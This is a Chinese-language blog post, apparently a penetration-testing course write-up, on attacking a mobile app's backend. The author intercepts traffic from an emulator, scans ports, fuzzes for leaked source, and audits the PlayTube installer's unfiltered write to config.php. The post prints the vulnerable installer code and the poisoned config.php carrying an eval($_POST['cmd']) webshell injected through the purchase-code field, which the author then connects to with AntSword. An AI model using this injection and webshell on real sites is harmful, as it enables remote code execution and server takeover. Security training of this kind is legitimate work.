@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="修改模拟器的hosts文件，雷电似乎不可以，用的是夜神。 1234adb rootadb remountadb pull &#x2F;system&#x2F;etc&#x2F;hostsadb push hosts &#x2F;system&#x2F;etc&#x2F;hosts  服务器开启ping命令检测是否可以连通： 1netsh firewall set icmpsetting 8  设置代理然后用Fiddler抓包，拿到域名直接浏览器访问即可。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探APP渗透">
+<meta property="og:url" content="http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/index.html">
+<meta property="og:site_name" content="Pursue&#39;s blog">
+<meta property="og:description" content="修改模拟器的hosts文件，雷电似乎不可以，用的是夜神。 1234adb rootadb remountadb pull &#x2F;system&#x2F;etc&#x2F;hostsadb push hosts &#x2F;system&#x2F;etc&#x2F;hosts  服务器开启ping命令检测是否可以连通： 1netsh firewall set icmpsetting 8  设置代理然后用Fiddler抓包，拿到域名直接浏览器访问即可。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/anyue/image-20230812142412272.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/anyue/image-20230812145524979.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/anyue/image-20230812145534463.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/anyue/image-20230812151644071.png">
+<meta property="og:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/anyue/image-20230812224026295.png">
+<meta property="article:published_time" content="2023-08-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-11-28T13:33:04.020Z">
+<meta property="article:author" content="Pursue">
+<meta property="article:tag" content="暗月">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/anyue/image-20230812142412272.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>初探APP渗透</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/08/23/Re/py/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/08/09/CTF/2023xctf/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&text=初探APP渗透"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&title=初探APP渗透"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&is_video=false&description=初探APP渗透"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=初探APP渗透&body=Check out this article: http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&title=初探APP渗透"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&title=初探APP渗透"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&title=初探APP渗透"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&title=初探APP渗透"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&name=初探APP渗透&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&t=初探APP渗透"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        初探APP渗透
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Pursue</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-08-11T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-08-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Penetration/">Penetration</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%9A%97%E6%9C%88/" rel="tag">暗月</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>修改模拟器的hosts文件，雷电似乎不可以，用的是夜神。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">adb pull /system/etc/hosts</span><br><span class="line">adb push hosts /system/etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>服务器开启ping命令检测是否可以连通：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set icmpsetting 8</span><br></pre></td></tr></table></figure>
+
+<p>设置代理然后用Fiddler抓包，拿到域名直接浏览器访问即可。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/anyue/image-20230812142412272.png" alt="image-20230812142412272"></p>
+<p>进行端口扫描和信息的收集，发现是宝塔面板搭建的网站。</p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/anyue/image-20230812145524979.png" alt="image-20230812145524979"></p>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/anyue/image-20230812145534463.png" alt="image-20230812145534463"></p>
+<p>目录扫描，用dirsearch和gobuster都没能扫出有用的，选择暗月佬推荐的项目，可以根据域名等进行fuzz，可以拿到源代码。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/Mosuan/FileScan">Mosuan&#x2F;FileScan: FileScan</a></p>
+</blockquote>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/anyue/image-20230812151644071.png" alt="image-20230812151644071"></p>
+<p>重构网站，导入数据库，动态调试寻找漏洞，通过代码审计，发现<code>/install/index.php</code>具有重写<code>/config.php</code>的功能，而且没有进行过滤。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$config_file_name</span> = <span class="string">&#x27;../config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;install&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sql_host&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;sql_user&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;sql_pass&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;sql_name&#x27;</span>]);</span><br><span class="line">   <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>()) &#123;</span><br><span class="line"></span><br><span class="line">       <span class="variable">$ServerErrors</span>[] = <span class="string">&quot;Failed to connect to MySQL: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$con</span>) &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      $sql = mysqli_query($con, &quot;SELECT @<span class="doctag">@sql</span>_mode as modes;&quot;);</span></span><br><span class="line"><span class="comment">      $sql_sql = mysqli_fetch_assoc($sql);</span></span><br><span class="line"><span class="comment">      if (count($sql_sql) &gt; 0) &#123;</span></span><br><span class="line"><span class="comment">         $results = <span class="doctag">@explode</span>(&#x27;,&#x27;, $sql_sql[&#x27;modes&#x27;]);</span></span><br><span class="line"><span class="comment">         if (in_array(&#x27;STRICT_TRANS_TABLES&#x27;, $results)) &#123;</span></span><br><span class="line"><span class="comment">           $ServerErrors[] = &quot;The sql-mode &lt;b&gt;STRICT_TRANS_TABLES&lt;/b&gt; is enabled in your mysql server, please contact your host provider to disable it.&quot;;</span></span><br><span class="line"><span class="comment">         &#125;</span></span><br><span class="line"><span class="comment">         if (in_array(&#x27;STRICT_ALL_TABLES&#x27;, $results)) &#123;</span></span><br><span class="line"><span class="comment">           $ServerErrors[] = &quot;The sql-mode &lt;b&gt;STRICT_ALL_TABLES&lt;/b&gt; is enabled in your mysql server, please contact your host provider to disable it.&quot;;</span></span><br><span class="line"><span class="comment">         &#125;</span></span><br><span class="line"><span class="comment">      &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;site_url&#x27;</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">       <span class="variable">$ServerErrors</span>[] = <span class="string">&quot;Invalid site url&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_username&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;admin_password&#x27;</span>])) &#123;</span><br><span class="line">       <span class="variable">$ServerErrors</span>[] = <span class="string">&quot;Please provide right admin username/password&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$p</span> = <span class="title function_ invoke__">check_</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;purshase_code&#x27;</span>]);</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$p</span>[<span class="string">&#x27;status&#x27;</span>])) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$p</span>[<span class="string">&#x27;status&#x27;</span>] == <span class="string">&#x27;ERROR&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$ServerErrors</span>[] = <span class="variable">$p</span>[<span class="string">&#x27;ERROR_NAME&#x27;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="variable">$ServerErrors</span>[] = <span class="string">&#x27;Failed to connect to server, please try again later, or contact us.&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//if ($ServerErrors) &#123;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$ServerErrors</span>)) &#123;</span><br><span class="line">      <span class="variable">$file_content</span> = </span><br><span class="line"><span class="string">&#x27;&lt;?php</span></span><br><span class="line"><span class="string">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string">// | @author Deen Doughouz (DoughouzForest)</span></span><br><span class="line"><span class="string">// | @author_url 1: http://www.playtubescript.com</span></span><br><span class="line"><span class="string">// | @author_url 2: http://codecanyon.net/user/doughouzforest</span></span><br><span class="line"><span class="string">// | @author_email: wowondersocial@gmail.com   </span></span><br><span class="line"><span class="string">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string">// | PlayTube - The Ultimate Video Sharing Platform</span></span><br><span class="line"><span class="string">// | Copyright (c) 2017 PlayTube. All rights reserved.</span></span><br><span class="line"><span class="string">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string">// MySQL Hostname</span></span><br><span class="line"><span class="string">$sql_db_host = &quot;&#x27;</span>  . <span class="variable">$_POST</span>[<span class="string">&#x27;sql_host&#x27;</span>] . <span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string">// MySQL Database User</span></span><br><span class="line"><span class="string">$sql_db_user = &quot;&#x27;</span>  . <span class="variable">$_POST</span>[<span class="string">&#x27;sql_user&#x27;</span>] . <span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string">// MySQL Database Password</span></span><br><span class="line"><span class="string">$sql_db_pass = &quot;&#x27;</span>  . <span class="variable">$_POST</span>[<span class="string">&#x27;sql_pass&#x27;</span>] . <span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string">// MySQL Database Name</span></span><br><span class="line"><span class="string">$sql_db_name = &quot;&#x27;</span>  . <span class="variable">$_POST</span>[<span class="string">&#x27;sql_name&#x27;</span>] . <span class="string">&#x27;&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Site URL</span></span><br><span class="line"><span class="string">$site_url = &quot;&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;site_url&#x27;</span>] . <span class="string">&#x27;&quot;; // e.g (http://example.com)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Purchase code</span></span><br><span class="line"><span class="string">$purchase_code = &quot;&#x27;</span> . <span class="variable">$_POST</span>[<span class="string">&#x27;purshase_code&#x27;</span>] . <span class="string">&#x27;&quot;; // Your purchase code, don\&#x27;t give it to anyone. </span></span><br><span class="line"><span class="string">?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$success</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config_file</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$config_file_name</span>, <span class="variable">$file_content</span>);			<span class="comment">// 写入 webshell</span></span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是保证数据库能够正常连接，这里在Kali上开启服务，注意版本之间的差别。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014101410/article/details/104687131">kali 2020.1 开启mysql远程访问</a></p>
+</blockquote>
+<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/img/anyue/image-20230812224026295.png" alt="image-20230812224026295"></p>
+<p>成功写入<code>config.php</code>，并成功上线蚁剑。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | @author Deen Doughouz (DoughouzForest)</span></span><br><span class="line"><span class="comment">// | @author_url 1: http://www.playtubescript.com</span></span><br><span class="line"><span class="comment">// | @author_url 2: http://codecanyon.net/user/doughouzforest</span></span><br><span class="line"><span class="comment">// | @author_email: wowondersocial@gmail.com   </span></span><br><span class="line"><span class="comment">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// | PlayTube - The Ultimate Video Sharing Platform</span></span><br><span class="line"><span class="comment">// | Copyright (c) 2017 PlayTube. All rights reserved.</span></span><br><span class="line"><span class="comment">// +------------------------------------------------------------------------+</span></span><br><span class="line"><span class="comment">// MySQL Hostname</span></span><br><span class="line"><span class="variable">$sql_db_host</span> = <span class="string">&quot;192.168.215.133&quot;</span>;</span><br><span class="line"><span class="comment">// MySQL Database User</span></span><br><span class="line"><span class="variable">$sql_db_user</span> = <span class="string">&quot;pursue&quot;</span>;</span><br><span class="line"><span class="comment">// MySQL Database Password</span></span><br><span class="line"><span class="variable">$sql_db_pass</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">// MySQL Database Name</span></span><br><span class="line"><span class="variable">$sql_db_name</span> = <span class="string">&quot;information_schema&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Site URL</span></span><br><span class="line"><span class="variable">$site_url</span> = <span class="string">&quot;http://www.a123.com&quot;</span>; <span class="comment">// e.g (http://example.com)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Purchase code</span></span><br><span class="line"><span class="variable">$purchase_code</span> = <span class="string">&quot;&#x27;&quot;</span>;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="string">&quot;&#x27;&quot;</span>; <span class="comment">// Your purchase code, don&#x27;t give it to anyone. </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/links/">links</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&text=初探APP渗透"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&title=初探APP渗透"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&is_video=false&description=初探APP渗透"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=初探APP渗透&body=Check out this article: http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&title=初探APP渗透"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&title=初探APP渗透"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&title=初探APP渗透"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&title=初探APP渗透"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&name=初探APP渗透&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/12/Penetration/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%8D%81/&t=初探APP渗透"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    Pursue
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://gitee.com/rmrfsad/rmrfsad">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
